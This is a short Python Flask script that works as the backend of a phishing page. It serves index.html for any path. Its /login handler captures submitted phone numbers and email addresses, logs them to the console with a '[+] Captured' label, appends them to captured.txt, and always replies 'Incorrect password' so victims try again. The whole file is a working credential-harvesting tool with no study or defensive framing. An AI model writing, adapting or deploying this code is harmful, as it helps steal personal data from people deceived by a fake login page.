from flask import Flask, request, send_from_directory

app = Flask(__name__)

@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def index(path):
    return send_from_directory(".", "index.html")

@app.route("/login", methods=["POST"])
def login():
    phone = request.form.get("phone")
    email = request.form.get("email")
    print(f"[+] Captured phone,email: {phone},{email}")
    with open("captured.txt","a") as f:
        f.write(f"{phone} {email}"+"\n")
    return "Incorrect password. Please try again."

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
